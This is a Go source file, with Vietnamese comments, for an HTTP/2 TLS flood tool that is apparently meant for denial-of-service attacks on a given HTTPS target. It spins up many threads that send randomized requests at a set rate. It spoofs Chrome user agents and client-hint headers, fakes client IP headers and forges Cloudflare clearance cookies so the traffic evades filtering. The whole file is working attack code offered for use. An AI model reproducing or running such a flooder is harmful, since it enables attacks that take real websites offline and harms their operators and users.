package main

import (
	"crypto/tls"
	"fmt"
	"golang.org/x/net/http2"
	"math/rand"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

// Danh sách UA mạnh hơn, giả lập Chrome nhiều phiên bản và OS khác nhau
var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.%d.%d Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_%d_%d) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.%d.%d Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.%d.%d Safari/537.36",
}

var referers = []string{
	"https://www.google.com/search?q=",
	"https://www.youtube.com/results?search_query=",
	"https://www.facebook.com/",
	"https://twitter.com/",
	"https://www.bing.com/search?q=",
}

var methods = []string{"HEAD", "GET", "OPTIONS"}

func randomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

func randomPath() string {
	// Path động + query động
	return fmt.Sprintf("/%s/%s?%s=%s&v=%d",
		randomString(rand.Intn(6)+4),
		randomString(rand.Intn(6)+4),
		randomString(5),
		randomString(8),
		rand.Intn(999999),
	)
}

func buildRequest(target string) *http.Request {
	fullURL := target + randomPath()
	method := methods[rand.Intn(len(methods))]
	req, _ := http.NewRequest(method, fullURL, nil)

	// User-Agent random nâng cao
	uaTemplate := userAgents[rand.Intn(len(userAgents))]
	ua := fmt.Sprintf(uaTemplate, rand.Intn(9), rand.Intn(9), rand.Intn(9), rand.Intn(9))
	referer := referers[rand.Intn(len(referers))] + randomString(rand.Intn(8)+3)

	// Header chính
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Referer", referer)
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Connection", "keep-alive")

	// Header Sec-* giả Chrome
	req.Header.Set("Sec-Ch-Ua", fmt.Sprintf(`"Not/A)Brand";v="99", "Google Chrome";v="%d", "Chromium";v="%d"`,
		100+rand.Intn(20), 100+rand.Intn(20)))
	req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
	req.Header.Set("Sec-Ch-Ua-Platform", `"Windows"`)
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "none")
	req.Header.Set("Sec-Fetch-User", "?1")

	// IP giả
	req.Header.Set("X-Forwarded-For", fmt.Sprintf("%d.%d.%d.%d",
		rand.Intn(223), rand.Intn(255), rand.Intn(255), rand.Intn(255)))
	req.Header.Set("X-Real-IP", fmt.Sprintf("%d.%d.%d.%d",
		rand.Intn(223), rand.Intn(255), rand.Intn(255), rand.Intn(255)))

	// Cookie random mới mỗi request
	req.Header.Set("Cookie", "cf_clearance="+randomString(32)+"; session="+randomString(16))

	return req
}

func attackMultiplex(client *http.Client, target string, rps int, stop <-chan struct{}) {
	ticker := time.NewTicker(time.Second / time.Duration(rps))
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			go func() {
				req := buildRequest(target)
				if resp, err := client.Do(req); err == nil {
					resp.Body.Close()
				}
			}()
		case <-stop:
			return
		}
	}
}

func attackThread(target string, rps int, duration int, wg *sync.WaitGroup) {
	defer wg.Done()

	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2", "http/1.1"},
		CipherSuites: []uint16{
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256},
	}

	tr := &http2.Transport{
		AllowHTTP:       false,
		TLSClientConfig: tlsConfig,
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second,
	}

	stop := make(chan struct{})
	go attackMultiplex(client, target, rps, stop)

	time.Sleep(time.Duration(duration) * time.Second)
	close(stop)
}

func main() {
	if len(os.Args) != 5 {
		fmt.Println("Usage: ./tls-flood-h2-strong <target> <threads> <rps> <duration>")
		return
	}

	target := os.Args[1]
	threads, _ := strconv.Atoi(os.Args[2])
	rps, _ := strconv.Atoi(os.Args[3])
	duration, _ := strconv.Atoi(os.Args[4])

	if !strings.HasPrefix(target, "https://") {
		fmt.Println("[!] Target must start with https://")
		return
	}

	rand.Seed(time.Now().UnixNano())

	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go attackThread(target, rps, duration, &wg)
	}
	wg.Wait()
}
